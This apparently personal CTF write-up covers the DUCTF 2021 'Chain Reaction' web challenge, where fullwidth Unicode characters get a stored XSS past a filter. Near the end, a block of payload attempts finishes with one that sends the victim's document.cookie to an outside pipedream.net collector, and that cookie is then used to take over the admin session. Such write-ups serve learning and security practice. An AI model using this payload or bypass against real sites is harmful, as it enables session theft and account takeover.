---
title: 'DUCTF{Writeup}'
categories: ['Hacking', 'Binary Exploitation', 'Web']
tags: ['hacking', 'pentesting', 'Exploit Development', 'CTF']
date: '2021-09-29'
type: 'post'
weight: 400
keywords: 'hacking pwntools'
toc: 'true'
---

As always DUCTF was a really good CTF with plenty of variety for beginners to the more experienced. I solved a good number of the web and pwn challenges but doing the writeup a bit later means I can't really provide a authentic thought process. Instead im just writing up my favourite challenge which I also have the best notes for.

## Web

### Chain Reaction

This was my favourite challenge from the CTF in the sense that I learnt the most from it. The challenge fell under the **web** category and was ladled 'easy'. The reasoning for which I imagine comes from the series of hints that are available in the challenge.

Initially when we first navigate to the site at `https://web-chainreaction-a4b5ae3b.chal-2021.duc.tf/home?terms=accepted` we get a page like the following.

![](https://i.imgur.com/TRupGR0.png)

Immediately when seeing the cards displayed im thinking about some kind of stored xss vector. As always I start by checking out various places like:

-   `/robots.txt` - which 404s
-   Cookies - have a session cookie
-   source - nothing much

Which leads to the next natural step, make an account. The register page is nothing special but does include a little snippet: 'Username (Cannot contain <, > characters ...', confirming my suspicion about XSS.

![](https://i.imgur.com/JlpdQmU.png)

After registering an account we are asked to login which leads to a page.

![](https://i.imgur.com/8jYnM2M.png)

Which points us to a developer page with a few really useful tidbits.

![](https://i.imgur.com/RTtByJ0.png)

If we navigate to `/admin` we get a not allowed message and are redirected to `/login` but if we go to `/devchat` we see a page like the following.

![](https://i.imgur.com/wUrYKMB.png)

Of primary intrest is this comment about normalising unicode characters.

![](https://i.imgur.com/bY5vCxU.png)

If we do some reading online we might come up with the following rough understanding of normalisation:

> TODO

```javascript
＜p/＞＜img onload="alert(document.cookie)"＞

＜p/＞＜h1＞TEST

＜img onload="console.log(1)"＞

＜p/＞＜h1＞TEST＜/h1＞

＜p/＞＜h1 onload=""＞TEST＜/h1＞


＜p/＞＜h1 onpointerover=""＞TEST＜/h1＞


＜p/＞＜img on="console.log(1)"＞＜h1＞TEST＜/h1＞


＜/p＞＜img src="x" onⅇrror="console.log(1)"/＞


＜/p＞＜img src="x" onⅇrror="fetch('https://enm6tgatobw64qw.m.pipedream.net?cook='+document.cookie)"/＞
```

![](https://i.imgur.com/jqxZUkV.png)

![](https://i.imgur.com/rTtqdt3.png)

Then by simply adding a new session cookie `admin-cookie` equal to the the stolen static admin session cookie we can hit `/admin` and collect the flag.

> DUCTF{\_un1c0de_bypass_x55_ftw!}

## Other Challenges :: TODO
